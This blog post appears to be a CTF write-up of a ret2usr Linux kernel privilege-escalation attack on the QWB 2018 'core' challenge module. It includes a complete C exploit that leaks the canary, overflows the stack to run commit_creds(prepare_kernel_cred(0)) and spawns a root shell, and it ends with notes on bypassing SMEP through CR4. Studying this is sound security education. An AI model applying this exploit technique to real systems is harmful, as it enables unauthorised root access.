---
layout: post
title: "ret2usr - 强网杯2018 - core"
date: 2022-07-11
description: ""
category: 
tags: []
---
* TOC
{:toc}


## ret2usr

[Attachment](https://github.com/hai119/QWB2018---core)

The ret2usr (return-to-user) attack leverages the fact that **userspace processes cannot access kernel space, but kernel space can access user space** to direct kernel code or data streams to user controls and execute user space code with the `ring 0` privilege to complete operations such as privilege escalation.

This vulnerability analysis is consistent with the [Kernel ROP](https://mudongliang.github.io/2022/07/07/%E5%BC%BA%E7%BD%91%E6%9D%AFCTF-core.html), the difference is that here we construct `commit_creds(prepare_kernel_cred(0))` in user space through the function pointer for privilege escalation. Although the function is in kernel space, at this point we are in ring0 privilege and can execute normally. 

It is worth noting that here the function pointer can be constructed based on the function prototypes of **prepare_kernel_cred()** and **commit_creds()**. Although the return value of **prepare_kernel_cred()** and the argument of **commit_creds()** is a pointer to a `cred_entry` structure, its essence is still a pointer. So the return value and argument are essentially a memory address, and neither the char pointer nor the **cred_entry** structure pointer is eight bytes.

```c
  67   │ void Getroot()
  68   │ {
  69   │     char* (*pkc)(int) = prepare_kernel_cred_addr;
  70   │     void (*cc)(char*) = commit_creds_addr;
  71   │     (*cc)((*pkc)(0));
  72   │ }
```

Then we only need to fill in the return address with the privilege escalation function address, rather than construct the ROP chain in the kernel space.

Compared to these two methods, we could conclude that ret2usr is easier than ROP.  Because it is generally much easier to construct purpose-specific code in user space than in kernel space.

```c
 102   │     for(i = 0; i < 10; i++)
 103   │     {
 104   │         rop[i] = canary;
 105   │     }
 106   │     rop[i++] = (size_t)Getroot;
 107   │     rop[i++] = swapgs;
 108   │     rop[i++] = 0;
```

exp:

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

#define CORE_READ 0x6677889B
#define CORE_OFF 0x6677889C
#define CORE_COPY 0x6677889A

size_t vmlinux_base,commit_creds_addr,prepare_kernel_cred_addr;
size_t user_cs,user_ss,user_sp,user_rflags;
size_t raw_vmlinux_base = 0xffffffff81000000;

void save_status()
{
	__asm__(
		"mov user_cs, cs;"
		"mov user_ss, ss;"
		"mov user_sp, rsp;"
		"pushf;"
		"pop user_rflags"
	);
}

void GetShell() {
    if (!getuid()) {
        system("/bin/sh");
    }
    else {
        puts("[-] CAN NOT GETSHELL.");
        exit(1);
    }
}

int find_symbols()
{
	char *ptr;
	char buf[0x40];
	FILE* fd = fopen("/tmp/kallsyms","r");
	if(!fd)
	{
		printf("[-] Open /tmp/kallsyms ERROR.\n");
		return 0;
	}
	while(fgets(buf,sizeof(buf),fd))
	{
		if(commit_creds_addr && prepare_kernel_cred_addr)
			return 1;
		if (strstr(buf, "commit_creds")) 
		{
            commit_creds_addr = strtoull(buf, &ptr, 16);
			printf("[+] Find: commit_creds: 0x%llx\n",commit_creds_addr);
        }
        if (strstr(buf, "prepare_kernel_cred")) 
		{
            prepare_kernel_cred_addr = strtoull(buf, &ptr, 16);
			printf("[+] Find: prepare_kernel_cred: 0x%llx\n",prepare_kernel_cred_addr);
        }
	}
	return 0;
}

void Getroot()
{
	char* (*pkc)(int) = prepare_kernel_cred_addr;
	void (*cc)(char*) = commit_creds_addr;
	(*cc)((*pkc)(0));
}

int main()
{
    save_status();
	int f=find_symbols();
	if(!f)
	{
		printf("[-]Find Symbols ERROR.\n");
		exit(0);
	}
	
	vmlinux_base = commit_creds_addr - 0x9c8e0;
	size_t offset = vmlinux_base - raw_vmlinux_base;
	size_t swapgs = 0xffffffff81a012da + offset;	//swapgs; popfq; ret;
	size_t iretq = 0xffffffff81050ac2 + offset;     //iretq; ret;
	size_t rop[0x100];
	char user_buf[0x40] = {0};
    int i;

	int fd = open("/proc/core", O_RDWR);
    if (!fd) {
        puts("[-] OPEN /proc/core ERROR.");
        exit(0);
    }
	ioctl(fd, CORE_OFF, 0x40);
    ioctl(fd, CORE_READ, user_buf);  //leak canary
	size_t canary = ((size_t *)user_buf)[0];
    printf("[+] Find canary: 0x%llx\n", canary);

    for(i = 0; i < 10; i++)
    {
        rop[i] = canary;
    }
	rop[i++] = (size_t)Getroot;
	rop[i++] = swapgs;
	rop[i++] = 0;
	rop[i++] = iretq;
    rop[i++] = (size_t)GetShell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;
	
	write(fd, rop, sizeof(rop));
	ioctl(fd, CORE_COPY, 0xffffffffffff0000|0x100);
	return 0;
}
```

## Prevention

### SMEP

Initially, when executing code in the kernel mode, it is possible to execute the code in the user space directly. Since the code in the user space is controllable by the attacker, it is easier to execute the attack. To prevent such attacks, researchers propose that code in the user state can't be executed when located in the kernel mode.

**Supervisor Memory Execute Protection (SMEP)** is a kernel security mechanism present in  Broadwell and later Intel CPUs. SMEP could prevent the kernel running in ring 0 from executing code that is user accessible. If the CPU is running in the ring0 mode, executing a code in user space will trigger a page fault. SMEP is similar to NX, but SMEP is in the kernel mode and NX is in the user mode. Like NX, SMEP requires processor support, which can be checked by `cat /proc/cpuinfo`.

### Bypass

Once we control the execution flow, we could execute gadgets in the kernel to modify the `CR4` register. After setting the `CR4` register to 0 in bit 20, we could execute the user space code in kernel mode. In general, we will use `0x6f0` to set the `CR4` register to close SMEP.

## Reference

[1] https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/

[2] https://unix.stackexchange.com/questions/5518/what-is-the-difference-between-the-following-kernel-makefile-terms-vmlinux-vml

[3] https://blog.csdn.net/gatieme/article/details/78311841

[4] https://www.anquanke.com/post/id/258874

[5] https://dangokyo.me/2019/01/27/linux-kernel-exploitation-part-3-ret2usr-and-smep/